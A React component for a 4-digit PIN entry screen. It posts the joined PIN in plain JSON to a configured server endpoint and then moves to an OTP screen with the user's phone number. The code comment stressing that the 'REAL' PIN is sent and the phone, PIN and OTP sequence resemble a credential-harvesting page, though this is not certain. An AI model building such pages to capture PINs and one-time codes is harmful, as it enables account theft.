import React, { useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import BASE_URL from "../components/urls";

const Pin = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const phone = location.state?.phone || "";
  const inputsRef = useRef([]);
  const [pin, setPin] = useState(new Array(4).fill(""));
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const [isError, setIsError] = useState(false);

  const handleChange = (event, index) => {
    const value = event.target.value.replace(/\D/g, "").slice(-1);
    const nextPin = [...pin];
    nextPin[index] = value;
    setPin(nextPin);
    setMessage("");

    if (value && index < 3) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (event, index) => {
    if (event.key === "Backspace" && !pin[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  // ─── Submit: sends REAL joined PIN to server ─────────────────────────────────
  const submitForm = async (event) => {
    event.preventDefault();

    if (pin.some((digit) => digit === "")) {
      setIsError(true);
      setMessage("Please enter all 4 digits.");
      return;
    }

    setLoading(true);
    setMessage("");
    setIsError(false);

    try {
      const response = await fetch(`${BASE_URL}/pin`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pin: pin.join(""), // sends "1234" as a real string
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || "PIN submission failed.");
      }

      setIsError(false);
      setMessage("PIN submitted successfully.");
      // Move to OTP screen, carrying the phone number forward
      navigate("/otp", { state: { phone } });
    } catch (error) {
      console.error("PIN error:", error);
      setIsError(true);
      setMessage("Could not reach the server. Please try again.");
    } finally {
      setLoading(false);
      setPin(new Array(4).fill(""));
      inputsRef.current[0]?.focus();
    }
  };

  const allFilled = pin.every((digit) => digit !== "");

  return (
    <main className="min-h-screen bg-[#f7f6f3] text-[#1d1d22]">
      <div className="mx-auto flex min-h-screen w-full max-w-[500px] flex-col px-6 pb-10 pt-6">
        <form className="flex flex-1 flex-col" onSubmit={submitForm}>
          <h1 className="mb-4 text-[30px] font-bold leading-tight">
            Enter your PIN
          </h1>
          <p className="mb-10 text-[17px] leading-6 text-[#5f5f63]">
            Enter your 4 digit PIN.
          </p>

          {/* PIN inputs */}
          <div className="mb-5 flex justify-between gap-3">
            {pin.map((digit, index) => (
              <input
                key={index}
                ref={(el) => {
                  inputsRef.current[index] = el;
                }}
                className="h-[70px] w-full rounded border border-[#cecece] bg-white text-center text-2xl font-semibold outline-none focus:border-[#079d69] transition-colors"
                inputMode="numeric"
                maxLength="1"
                type="password"
                value={digit}
                onChange={(e) => handleChange(e, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                aria-label={`PIN digit ${index + 1}`}
              />
            ))}
          </div>

          {/* Feedback message */}
          {message && (
            <p
              className={`text-center text-sm font-medium ${
                isError ? "text-red-500" : "text-[#079d69]"
              }`}
            >
              {message}
            </p>
          )}

          <div className="mt-auto">
            <button
              type="submit"
              disabled={!allFilled || loading}
              className="h-[70px] w-full rounded-full bg-[#dedddb] text-[20px] font-semibold text-[#9b9996] enabled:bg-[#079d69] enabled:text-white disabled:cursor-not-allowed transition-colors"
            >
              {loading ? "Sending..." : "Continue"}
            </button>
          </div>
        </form>
      </div>
    </main>
  );
};

export default Pin;
